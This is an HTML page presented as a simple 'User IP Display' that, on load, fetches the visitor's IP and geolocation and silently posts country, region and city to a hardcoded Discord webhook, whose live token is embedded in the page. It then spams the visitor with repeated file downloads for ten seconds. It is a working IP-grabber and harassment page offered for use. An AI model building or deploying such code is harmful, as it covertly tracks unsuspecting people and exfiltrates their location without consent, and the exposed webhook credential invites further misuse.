<!DOCTYPE html>
<html>
<head>
    <title>User IP Display</title>
    <script>
        function getIP() {
            fetch('https://api.ipify.org/?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    document.getElementById('ipDisplay').innerText = 'IP: ' + ip;
                    sendIPToWebhook(ip);
                })
                .catch(error => {
                    console.log('Error:', error);
                });
        }

        function sendIPToWebhook(ip) {
            fetch('http://ip-api.com/json/' + ip)
                .then(response => response.json())
                .then(data => {
                    const { country, regionName, city, areaCode } = data;
                    const locationDetails = `Country: ${country}\nRegion: ${regionName}\nCity: ${city}\nArea Code: ${areaCode}`;

                    const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
                    const payload = {
                        content: locationDetails
                    };

                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log('Location details sent to webhook successfully.');
                            downloadFile(ip); // Call the function to download the file after sending the location details
                        } else {
                            console.log('Failed to send location details to webhook.');
                        }
                    })
                    .catch(error => {
                        console.log('Error:', error);
                    });
                })
                .catch(error => {
                    console.log('Error:', error);
                });
        }

        function downloadFile(ip) {
            const filename = 'location.txt';
            const content = 'IP: ' + ip;
            const element = document.createElement('a');
            element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(content));
            element.setAttribute('download', filename);
            element.style.display = 'none';
            document.body.appendChild(element);

            // Set an interval to repeatedly trigger the file download
            const intervalId = setInterval(() => {
                element.click();
            }, 100); // Adjust the interval (in milliseconds) to control the speed of spamming

            // Optional: Stop the spamming after a certain duration
            setTimeout(() => {
                clearInterval(intervalId);
            }, 10000); // Change the duration (in milliseconds) as needed

            // Optional: Remove the element after the spamming stops
            setTimeout(() => {
                document.body.removeChild(element);
            }, 11000); // Adjust the timing (in milliseconds) as needed
        }
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        h1 {
            margin-bottom: 20px;
        }
    </style>
</head>
<body onload="getIP()">
    <h1 id="ipDisplay">Loading...</h1>
    <p>:)))))):</p>
</body>
</html>
